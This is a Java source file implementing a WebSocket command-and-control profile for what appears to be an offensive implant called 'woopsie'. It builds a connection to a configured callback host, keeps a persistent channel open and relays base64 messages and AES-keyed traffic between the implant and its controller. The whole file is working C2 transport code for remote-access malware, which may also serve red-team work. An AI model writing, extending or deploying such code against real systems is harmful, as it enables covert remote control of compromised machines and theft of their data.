package com.woopsie.profiles;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;

/**
 * WebSocket C2 Profile
 * Maintains persistent WebSocket connection for bi-directional communication
 */
public class WebSocketProfile implements C2Profile {
    private final Config config;
    private final ObjectMapper objectMapper;
    private byte[] aesKey;
    
    // WebSocket client
    private WoopsieWebSocketClient wsClient;
    private final String wsUrl;
    private final Map<String, String> headers;
    
    // Message queue for responses
    private final BlockingQueue<String> responseQueue;
    
    public WebSocketProfile(Config config) {
        this.config = config;
        this.objectMapper = new ObjectMapper();
        this.aesKey = null;
        this.responseQueue = new LinkedBlockingQueue<>();
        
        // Build WebSocket URL
        this.wsUrl = buildWebSocketUrl();
        this.headers = buildHeaders();
        
        Config.debugLog(config, "WebSocket Profile initialized with URL: " + wsUrl);
    }
    
    private String buildWebSocketUrl() {
        String callbackHost = config.getCallbackHost();
        String callbackPort = String.valueOf(config.getCallbackPort());
        String endpoint = config.getEndpointReplace(); // Use ENDPOINT_REPLACE for WebSocket
        
        // Determine protocol based on port or existing scheme
        String protocol;
        String host = callbackHost;
        
        if (callbackHost.startsWith("wss://") || callbackHost.startsWith("ws://")) {
            protocol = callbackHost.startsWith("wss://") ? "wss" : "ws";
            host = callbackHost.substring(protocol.length() + 3); // Remove protocol
        } else if (callbackHost.startsWith("https://") || callbackHost.startsWith("http://")) {
            protocol = callbackHost.startsWith("https://") ? "wss" : "ws";
            host = callbackHost.substring(callbackHost.indexOf("://") + 3); // Remove http(s)://
        } else {
            protocol = "443".equals(callbackPort) ? "wss" : "ws";
        }
        
        // Remove trailing slashes from host
        host = host.replaceAll("/$", "");
        
        // Remove leading slashes from endpoint
        String cleanEndpoint = endpoint.replaceAll("^/+", "");
        
        // Build URL
        return String.format("%s://%s:%s/%s", protocol, host, callbackPort, cleanEndpoint);
    }
    
    private Map<String, String> buildHeaders() {
        Map<String, String> headers = new HashMap<>();
        
        // Add User-Agent from config
        Map<String, String> configHeaders = config.getHeaders();
        if (configHeaders != null && configHeaders.containsKey("User-Agent")) {
            headers.put("User-Agent", configHeaders.get("User-Agent"));
        } else {
            headers.put("User-Agent", "");
        }
        
        // Add any other custom headers from config
        if (configHeaders != null) {
            headers.putAll(configHeaders);
        }
        
        return headers;
    }
    
    private void ensureConnection() throws Exception {
        if (wsClient == null || wsClient.isClosed()) {
            Config.debugLog(config, "Establishing WebSocket connection to: " + wsUrl);
            
            wsClient = new WoopsieWebSocketClient(new URI(wsUrl), headers, responseQueue, config);
            
            // Connect with timeout
            boolean connected = wsClient.connectBlocking(30, TimeUnit.SECONDS);
            if (!connected) {
                throw new Exception("Failed to connect to WebSocket server");
            }
            
            Config.debugLog(config, "WebSocket connection established");
        }
    }
    
    @Override
    public String send(String data) throws Exception {
        ensureConnection();
        
        // Create message in format: {"data":"<base64>"}
        Map<String, String> message = new HashMap<>();
        message.put("data", data);
        String jsonMessage = objectMapper.writeValueAsString(message);
        
        Config.debugLog(config, "Sending WebSocket message");
        
        // Clear any stale responses
        responseQueue.clear();
        
        // Send message
        wsClient.send(jsonMessage);
        
        // Wait for response (with timeout)
        String response = responseQueue.poll(60, TimeUnit.SECONDS);
        if (response == null) {
            throw new Exception("Timeout waiting for WebSocket response");
        }
        
        Config.debugLog(config, "Received WebSocket response");
        
        // Parse response to extract data field
        JsonNode responseNode = objectMapper.readTree(response);
        if (responseNode.has("data")) {
            return responseNode.get("data").asText();
        }
        
        throw new Exception("Invalid WebSocket response format");
    }
    
    @Override
    public byte[] getAesKey() {
        return aesKey;
    }
    
    @Override
    public void setAesKey(byte[] key) {
        this.aesKey = key;
    }
    
    @Override
    public String getProfileName() {
        return "websocket";
    }
    
    /**
     * Close the WebSocket connection
     */
    public void close() {
        if (wsClient != null && !wsClient.isClosed()) {
            Config.debugLog(config, "Closing WebSocket connection");
            wsClient.close();
        }
    }
    
    /**
     * Inner class for WebSocket client implementation
     */
    private static class WoopsieWebSocketClient extends WebSocketClient {
        private final BlockingQueue<String> responseQueue;
        private final Config config;
        
        public WoopsieWebSocketClient(URI serverUri, Map<String, String> headers, 
                                     BlockingQueue<String> responseQueue, Config config) {
            super(serverUri, headers);
            this.responseQueue = responseQueue;
            this.config = config;
        }
        
        @Override
        public void onOpen(ServerHandshake handshakedata) {
            Config.debugLog(config, "WebSocket connection opened");
        }
        
        @Override
        public void onMessage(String message) {
            Config.debugLog(config, "Received WebSocket message");
            responseQueue.offer(message);
        }
        
        @Override
        public void onClose(int code, String reason, boolean remote) {
            Config.debugLog(config, "WebSocket connection closed: " + reason);
        }
        
        @Override
        public void onError(Exception ex) {
            Config.debugLog(config, "WebSocket error: " + ex.getMessage());
        }
    }
}
